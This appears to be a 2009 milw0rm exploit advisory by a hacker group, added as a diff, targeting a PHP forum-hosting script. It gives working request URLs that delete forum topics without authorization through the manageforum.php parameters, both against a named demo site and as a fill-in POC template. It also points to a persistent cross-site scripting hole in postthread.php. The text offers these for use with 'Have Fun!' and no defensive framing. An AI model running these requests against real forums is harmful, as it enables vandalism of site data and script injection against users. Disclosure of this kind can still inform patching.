@@ -1,0 +1,55 @@
+_______         ___________
+\   _  \ ___  __\_   _____/
+/  /_\  \\  \/  /|    __)  
+\  \_/   \>    < |     \   
+ \_____  /__/\_ \\___  /   
+       \/      \/    \/    
+                       #ruling the web since 9/2008
+
+
+"Word is born 
+            Fight the war 
+                         fuck the norm!"
+
+
+[=]    "PHP Script Forum Hoster" Multiple vulnerabilities
+
+       Vendor   : http://www.shop-020.de
+       Download : http://www.shop-020.de/phpscriptat-p12h4s5-PHP-Forum-Hoster-Por.html
+       Author   : int_main();
+       Site     : 0xFEE1DEAD.de
+       Greez    : BrainWash,Thunderbird,STEAL,The Papst,eddy14,MagicFridge,Patrick B,Hero,tmh,Lorenz,iNs,Cod1K
+
+[================================================================================] 
+
+1.) unauthorized topic deletion
+
+Get the Forum and Topic ID ( "topic" "forum" )
+
+
+http://www.city-demo.at/forum//topic.php?topic=12&forum=6
+
+Unauthorized deletion:
+
+http://www.city-demo.at/forum//manageforum.php?forum=6&&step=6&delt=12
+
+POC:
+
+http://[site]/forum//topic.php?topic=[topicid]&forum=[forumid]
+http://[site]/forum//manageforum.php?forum=[forumid]&&step=[forumid]&delt=[topicid]
+
+[================================================================================] 
+
+
+2.) persistent XSS vulnerabilitys (some fun with HTML :P)
+
+http://www.city-demo.at/forum/postthread.php
+
+http://[site]/forum//postthread.php
+
+Write some Javascript/HTML Code into the $_POST sections.
+
+
+Have Fun!
+
+# milw0rm.com [2009-08-06]
